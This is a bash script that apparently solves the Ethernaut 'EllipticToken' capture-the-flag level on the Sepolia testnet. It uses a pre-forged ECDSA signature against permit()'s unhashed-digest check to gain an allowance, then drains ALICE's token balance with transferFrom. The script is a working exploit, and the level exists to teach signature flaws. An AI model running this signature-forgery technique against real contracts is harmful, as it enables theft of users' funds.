#!/usr/bin/env bash
# attack_sepolia.sh — run the EllipticToken exploit against the real Sepolia
# instance in .env. Run this yourself, interactively, in your own terminal
# (not through an assistant) since it prompts for your keystore password.
#
# Requires in .env: LEVEL (instance address), MY_ADDRESS (your EOA),
# RPC_URL (Sepolia RPC). Requires a Foundry encrypted keystore for
# MY_ADDRESS — this script uses `--account TestAccount`; change that if
# your keystore has a different name (`cast wallet list` to check).
#
# What this does, step by step (see NOTES.md for the full writeup):
#   1. Uses a pre-forged (amount, r, s, v) that makes `permit`'s
#      ECDSA.recover(bytes32(amount), ownerSig) resolve to ALICE, without
#      ever knowing her private key (existential forgery on the unhashed
#      digest permit() uses).
#   2. Signs permitAcceptHash with YOUR real key (a normal, honest
#      signature — you really are the spender).
#   3. Calls permit(...) -> contract sets _approve(ALICE, you, amount).
#   4. Calls transferFrom(ALICE, you, 10 ether) -> drains her balance to 0.
#   5. Verifies balanceOf(ALICE) == 0 on-chain.
#
# After this succeeds, go hit "Submit instance" on the Ethernaut level page.

set -euo pipefail
cd "$(dirname "$0")/.."
set -a; source .env; set +a

: "${LEVEL:?set LEVEL in .env}"
: "${MY_ADDRESS:?set MY_ADDRESS in .env}"
: "${RPC_URL:?set RPC_URL in .env}"

KEYSTORE_ACCOUNT="TestAccount"   # change if your keystore has a different name

ALICE=0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e
ATTACKER="$MY_ADDRESS"

# --- Step 1: the pre-forged owner signature (non-secret, computed offline
# by script/recover_pubkey.py --forge; identical to the values proven in
# test/EllipticToken.t.sol — they don't depend on network or attacker) ---
AMOUNT=0xc63c77409ca2154f3808507d07f3ac0c4c61578ea06f99ab9c83fc9970c7c4e4
OWNER_SIG=0xb47af4938548c0bcfa7071ce6d307201cdd81834411e0d6e38226fbf71c503942a5d3faca421e43527b7e2fd6e499bd3e9a7f183fba7119ff1aa3202fe51c07d1c

echo "== Sanity: current ALICE balance on the live instance =="
cast call "$LEVEL" "balanceOf(address)(uint256)" "$ALICE" --rpc-url "$RPC_URL"

# --- Step 2: permitAcceptHash, and YOUR real signature over it ---
# permitAcceptHash = keccak256(abi.encodePacked(tokenOwner=ALICE, spender=attacker, amount))
PACKED="${ALICE#0x}${ATTACKER#0x}$(python3 -c "print(f'{$AMOUNT:064x}')")"
PERMIT_ACCEPT_HASH=$(cast keccak "0x$PACKED")
echo "permitAcceptHash = $PERMIT_ACCEPT_HASH"

echo
echo "== Signing permitAcceptHash as $ATTACKER (you'll be prompted for your keystore password) =="
SPENDER_SIG=$(cast wallet sign --no-hash "$PERMIT_ACCEPT_HASH" --account "$KEYSTORE_ACCOUNT")
echo "spenderSig = $SPENDER_SIG"

# --- Step 3: call permit() ---
echo
echo "== Sending permit(amount, attacker, ownerSig, spenderSig) =="
cast send "$LEVEL" "permit(uint256,address,bytes,bytes)" \
    "$AMOUNT" "$ATTACKER" "$OWNER_SIG" "$SPENDER_SIG" \
    --rpc-url "$RPC_URL" --account "$KEYSTORE_ACCOUNT"

echo
echo "== Confirming allowance ALICE -> attacker =="
cast call "$LEVEL" "allowance(address,address)(uint256)" "$ALICE" "$ATTACKER" --rpc-url "$RPC_URL"

# --- Step 4: drain via transferFrom ---
echo
echo "== Sending transferFrom(ALICE, attacker, 10 ether) =="
cast send "$LEVEL" "transferFrom(address,address,uint256)" \
    "$ALICE" "$ATTACKER" "10000000000000000000" \
    --rpc-url "$RPC_URL" --account "$KEYSTORE_ACCOUNT"

# --- Step 5: verify the win condition ---
echo
echo "== Final ALICE balance (should be 0) =="
cast call "$LEVEL" "balanceOf(address)(uint256)" "$ALICE" --rpc-url "$RPC_URL"
